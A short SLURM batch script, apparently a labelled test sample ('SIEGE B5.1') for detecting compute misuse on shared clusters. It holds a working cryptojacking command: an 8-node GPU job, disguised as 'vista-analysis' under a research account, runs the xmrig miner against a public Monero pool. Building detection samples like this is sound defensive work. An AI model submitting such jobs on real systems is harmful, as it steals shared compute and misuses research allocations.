#!/bin/bash -l
# SIEGE B5.1 -- direct mining-binary invocation.
# The allocation is spent running a pre-staged Monero miner against a
# public pool. No obfuscation: the binary is invoked by name.
#SBATCH --job-name=vista-analysis
#SBATCH --account=approved-research
#SBATCH --partition=gpu
#SBATCH --nodes=8
#SBATCH --time=04:00:00

srun ./xmrig --url stratum+tcp://pool.minexmr.com:4444 \
    --user 4xMonEr0WaLLeTaDDr3ss --donate-level 1 --tls
